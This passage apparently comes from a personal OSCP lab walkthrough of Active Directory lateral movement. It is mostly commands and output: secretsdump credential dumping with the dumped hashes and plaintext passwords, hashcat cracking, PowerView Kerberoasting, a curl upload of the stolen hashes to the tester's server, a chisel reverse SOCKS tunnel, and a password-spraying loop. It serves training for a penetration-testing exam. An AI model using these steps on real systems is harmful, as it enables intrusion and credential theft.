SMB         192.168.135.147 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)
LSASSY      192.168.135.147 445    MS01             Saved 15 Kerberos ticket(s) to /home/tester/.nxc/modules/lsassy
LSASSY      192.168.135.147 445    MS01             OSCP\web_svc 53e938166782a44e241beaf02d081ff6
LSASSY      192.168.135.147 445    MS01             MS01\cloudbase-init b597842d084f4e6bc3ebf9da497b00a9

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Impacket-SecretsDump" >}}  Adding the user into Administrators group ,and using the impacket-secretsdump to reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.

{{< /toggle >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $impacket-secretsdump oscp.exam/Eric.Wallows:"EricLikesRunning800"@192.168.135.147
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xa5403534b0978445a2df2d30d19a7980
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:b597842d084f4e6bc3ebf9da497b00a9:::
Admin:1005:aad3b435b51404eeaad3b435b51404ee:76c9becaa084a4b873b8160469b42700:::
tester:1006:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2022-11-10 10:06:42)
OSCP.EXAM/web_svc:$DCC2$10240#web_svc#130379745455ae62bbf41faa0572f6d3: (2026-07-04 10:22:48)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OSCP\MS01$:aes256-cts-hmac-sha1-96:79fcd5adde5c157e8aaf1274433fa67d9e847f8a2814e2e6c41d16104e73793c
OSCP\MS01$:aes128-cts-hmac-sha1-96:e17c1d41089afa7923a9703e5003ba01
OSCP\MS01$:des-cbc-md5:1c32cb76efc78ae3
OSCP\MS01$:plain_password_hex:996d3ede914e0ae37e32537dd513ec3986fb71e69f5693eccb30bf68b82dc36e3dfe5bac28c16126e071ad6c535c1e136aeb7da1193b6028a981bc7adbcfbbc491070313e603279eab5e42b430c828a7170911034aead19ddd94dc36c889ffb81749fc9fbf86ff822b046a02d97d329481a26ce6fe971ab8ddc64b05eba7c49b2e5d00a30b02884378574c5ddb1d587827044f0ccbf24f73b100a3e5ca9d123d069f7a3b6dfd94600aabff3b9f30f5435eea8a5f6c34b5c4091789be3f26af10107e1a3c7bd57ebe21ce50e9febd9b5786d9433f956fdaaa4ba84f6189971ab7a2f8aaf8541e78c57b740f871dfdea95
OSCP\MS01$:aad3b435b51404eeaad3b435b51404ee:c95248e31501068270755ddfd382f3e8:::
[*] DefaultPassword 
oscp.exam\celia.almeda:7k8XHk3dMtmpnC7
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x14cc9accbb06d4af8f07295749933b06cf0d6dfd
dpapi_userkey:0x4c31eb802e3529d34f198a0473a6745cf5948527
[*] NL$KM 
 0000   F1 9F 8D 0A 3D 6B 2D 13  69 96 2E 4C 32 4D C3 66   ....=k-.i..L2M.f
 0010   D5 36 97 AB 1F 0B F2 38  11 3E DF 05 AE DF 31 70   .6.....8.>....1p
 0020   C0 E3 97 A0 08 31 A9 2A  E3 88 48 DD 2C 88 86 56   .....1.*..H.,..V
 0030   83 C9 79 90 03 D5 9D 28  C1 BE 33 D6 0E 7B B7 9B   ..y....(..3..{..
NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a00831a92ae38848dd2c88865683c9799003d59d28c1be33d60e7bb79b
[*] _SC_cloudbase-init 
cloudbase-init:ohrCkpC9Zs7OT1t3QMGX
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

Create the user hashes

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $cat userhashes.txt | awk  -F: '{print $4, $NF}' 
3c4495bbd678fac8c9d218be4f2bbc7b 
31d6cfe0d16ae931b73c59d7e0c089c0 
31d6cfe0d16ae931b73c59d7e0c089c0 
11ba4cb6993d434d8dbba9ba45fd9011 
9a3121977ee93af56ebd0ef4f527a35e 
d9358122015c5b159574a88b3c0d2071 
b597842d084f4e6bc3ebf9da497b00a9 
76c9becaa084a4b873b8160469b42700 
e19ccf75ee54e06b06a5907af13cef42 

```

Using the hashcat with -m to decode the password

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $hashcat userhashes.txt  -m 1000 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 2897/5859 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 9 digests; 8 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

31d6cfe0d16ae931b73c59d7e0c089c0:                         
e19ccf75ee54e06b06a5907af13cef42:P@ssw0rd                 
d9358122015c5b159574a88b3c0d2071:Freedom1                 
3c4495bbd678fac8c9d218be4f2bbc7b:December31 
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $cat userhashes.txt | awk  -F: '{print $1, $NF}' 
Administrator 
Guest 
DefaultAccount 
WDAGUtilityAccount 
Mary.Williams 
support 
cloudbase-init 
Admin 
tester 
 
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $cat userhashes.txt | awk  -F: '{print $1, $NF}'  > username 
```

### PowerView

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Kerberos" >}} In Windows Internal to use the PowerView ps1 to discover the sql server 's user

{{< /toggle >}}

Download the PowerView.ps1

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1 
```

cd  C:\ProgramData\ to bypass the limit

```
PS C:\Users\eric.wallows\Documents> cd C:\ProgramData\
```

bypass the powershell script limit

```
PS C:\Users\eric.wallows\Documents> Set-ExecutionPolicy Bypass -Scope Process -Force
```

```
PS C:\Users\eric.wallows\Documents> Import-Module .\\PowerView.ps1 -Force
```

```
PS C:\Users\eric.wallows\Documents> . .\\PowerView.ps1
```

simple to check who in the list

```
PS C:\Users\eric.wallows\Documents> Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

Let the kerberos user to export as the csv

```
PS C:\Users\eric.wallows\Documents> Get-DomainUser -SPN | Get-DomainSPNTicket | Select-Object SamAccountName, Hash | Export-Csv -Path ./spn_hashes.csv -NoTypeInformation
```

{{< toggle "Tag 🏷️" >}}

{{< tag "File-transfer-python-uploadserver" >}} Setup the python server for easily to download and upload the fiel

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $python -m uploadserver
```

```
PS C:\Users\eric.wallows\Documents> curl -X POST http://192.168.45.161:8000/upload -F "files=@spn_hashes.csv "
```

Change the CSV to hash able for hashcat

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $ grep -oP '\$krb5tgs\$.*"' spn_hashes.csv | tr -d '"' > spn_hashes.txt
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 255U, 2897/5859 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'spn_hashes.txt' on line 1 ($krb5t...03FEF7B1CC3EBCEFB8BC1127DB659382): Separator unmatched
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

```

# IP 3

### naabu.exe

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-naabu" >}} Setting the naabu in windows internal for discovering the target 's IP and Ports

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget https://github.com/projectdiscovery/naabu/releases/download/v2.6.1/naabu_2.6.1_windows_386.zip
--2026-07-05 00:05:35--  https://github.com/projectdiscovery/naabu/releases/download/v2.6.1/naabu_2.6.1_windows_386.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found

```

unzip the file

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $unzip naabu_2.6.1_windows_386.zip 
Archive:  naabu_2.6.1_windows_386.zip
  inflating: LICENSE.md              
  inflating: README.md               
  inflating: naabu.exe     
```

upload naabu

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> upload naabu.exe  .
Uploading /home/tester/Desktop/offsec/oscpB/naabu.exe: 31.1MB [01:18, 413kB/s]                         
[+] File uploaded successfully as: C:\Users\eric.wallows\Documents\naabu.exe

```

using the naabu.exe to find the ip all port

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> .\naabu.exe  -p 1-65535 -host 10.10.135.148
10.10.135.148:49700
10.10.135.148:49669
10.10.135.148:49664
10.10.135.148:49671
10.10.135.148:445
10.10.135.148:49665
10.10.135.148:49670
10.10.135.148:135
10.10.135.148:5040
10.10.135.148:5985
10.10.135.148:5986
10.10.135.148:139
10.10.135.148:49667
10.10.135.148:1433
10.10.135.148:47001
10.10.135.148:49668
10.10.135.148:49666
System.Management.Automation.RemoteException
                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/
System.Management.Automation.RemoteException
		projectdiscovery.io
System.Management.Automation.RemoteException
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
[INF] Found 17 ports on host 10.10.135.148 (10.10.135.148)

```

### chisel

enable the  chisel

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $chisel server -p 8080 --socks5 --reverse -v
2026/07/04 23:55:38 server: Reverse tunnelling enabled
2026/07/04 23:55:38 server: Fingerprint x5jIH+3P+9/p5qHQuBCCRYTTiz9PoQIrJgPgE1k/YQI=
2026/07/04 23:55:38 server: Listening on http://0.0.0.0:8080
2026/07/04 23:57:14 server: session#1: Handshaking with 192.168.135.147:64159...
2026/07/04 23:57:14 server: session#1: Verifying configuration
2026/07/04 23:57:14 server: session#1: Client version (1.11.3) differs from server version (1.11.3-0parrot1)
2026/07/04 23:57:14 server: session#1: tun: Created (SOCKS enabled)
2026/07/04 23:57:14 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2026/07/04 23:57:14 server: session#1: tun: Bound proxies
2026/07/04 23:57:14 server: session#1: tun: SSH connected


```

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> ./chisel.exe client 192.168.45.161:8080 R:socks
```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $cat  /etc/proxychains.conf 
# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#	

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
#dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app

dynamic_chain
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 1080 
```

test the proxychains is work

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $proxychains4 nxc smb 10.10.135.148 -u username -p password 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
SMB         10.10.135.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Administrator:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK

```

### Valid account

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Account-Verify-Nxc" >}} I have the list of username and password , remembering using the --continue-on-success in the nxc ;otherwise,  you may miss the vaild account

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; proxychains4 netexec $proto 10.10.135.148  -u username -p  password  $auth --continue-on-success ; done; done

[*] Testing smb ...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
SMB         10.10.135.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Administrator:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Guest:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\DefaultAccount:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\WDAGUtilityAccount:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Mary.Williams:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\support:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\cloudbase-init:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Admin:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\web_svc:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\sql_svc:December31 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Administrator:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Guest:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\DefaultAccount:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\WDAGUtilityAccount:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Mary.Williams:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\support:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\cloudbase-init:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Admin:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\web_svc:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\sql_svc:Freedom1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Administrator:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Guest:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\DefaultAccount:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\WDAGUtilityAccount:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Mary.Williams:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\support:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\cloudbase-init:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Admin:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [+] oscp.exam\web_svc:Diamond1 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\sql_svc:Diamond1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Administrator:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Guest:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\DefaultAccount:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\WDAGUtilityAccount:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Mary.Williams:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\support:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\cloudbase-init:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] oscp.exam\Admin:Dolphin1 STATUS_LOGON_FAILURE 
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [+] oscp.exam\sql_svc:Dolphin1 

[*] Testing smb (local-auth)...
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:135  ...  OK
SMB         10.10.135.148   445    MS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.135.148:445  ...  OK
SMB         10.10.135.148   445    MS02             [-] MS02\Administrator:December31 STATUS_LOGON_FAILURE 
